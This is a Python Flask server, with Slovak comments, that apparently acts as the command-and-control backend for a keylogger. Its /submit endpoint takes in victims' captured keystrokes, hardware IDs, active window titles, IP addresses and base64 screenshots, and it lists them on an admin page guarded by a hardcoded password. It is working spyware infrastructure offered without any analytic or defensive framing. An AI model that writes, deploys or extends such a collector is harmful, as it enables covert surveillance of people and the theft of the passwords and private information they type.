from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)
PASSWORD = "120202810428Jm!"
DATA = []

@app.route('/')
def home():
    return redirect('/admin')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        json_data = request.get_json(force=True)

        if not json_data:
            return {"status": "error", "message": "No JSON data received"}, 400

        # Spracuj prijaté dáta bezpečne
        raw_keys = json_data.get('keys')

        # Ochrana: ak nie je string alebo je to callable objekt
        if callable(raw_keys):
            keys_value = str(raw_keys)
        elif not isinstance(raw_keys, str):
            keys_value = repr(raw_keys)
        else:
            keys_value = raw_keys

        ip_address = request.remote_addr or 'N/A'

        entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'user_id': json_data.get('user_id', 'N/A'),
            'hwid': json_data.get('hwid', 'N/A'),
            'ip_address': ip_address,
            'keys': keys_value,
            'active_window': json_data.get('active_window', 'N/A'),
            'screenshot': json_data.get('screenshot')  # base64 obrázok (ak sa posiela)
        }

        DATA.append(entry)

        print(f"[{entry['timestamp']}] {entry['user_id']} | {ip_address} | {keys_value}")

        return {"status": "received"}, 200

    except Exception as e:
        print(f"Error in /submit: {str(e)}")
        return {"status": "error", "message": str(e)}, 500

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            return render_template("admin.html", data=DATA)
        else:
            return render_template("login.html", error="Zlé heslo")
    return render_template("login.html")

@app.route('/logout')
def logout():
    return redirect('/admin')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)












